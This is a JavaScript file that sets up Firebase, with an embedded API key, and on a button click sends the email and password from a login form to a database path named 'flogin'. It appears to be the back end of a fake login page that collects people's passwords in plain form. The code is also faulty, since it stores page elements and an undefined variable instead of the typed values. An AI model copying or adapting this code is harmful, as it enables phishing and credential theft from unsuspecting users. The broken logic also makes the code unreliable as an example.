 // Your web app's Firebase configuration
  // For Firebase JS SDK v7.20.0 and later, measurementId is optional
  var firebaseConfig = {
    apiKey: "AIzaSyBWTs5YA3POIice1TXno2GO9tYGHFJTjk0",
    authDomain: "crimson-33.firebaseapp.com",
    databaseURL: "https://crimson-33.firebaseio.com",
    projectId: "crimson-33",
    storageBucket: "crimson-33.appspot.com",
    messagingSenderId: "801019593695",
    appId: "1:801019593695:web:e9b9b1ea0b77bc3b7d3a6a",
    measurementId: "G-QNGLP6GJSR"
  };
  // Initialize Firebase
  firebase.initializeApp(firebaseConfig);
  firebase.analytics();

//Get values
const email = document.getElementById("ema");
const pwd = document.getElementById("password");
const submit = document.getElementById("sub");
const database = firebase.database();
const rootRef = database.ref("flogin");
//Add click event to submit button

submit.addEventListener("click", function(e){
    e.preventDefault(e);
    rootRef.child(ema.value).set({
        email: ema,
        pwd: password
    });
    console.log("pwd");
 });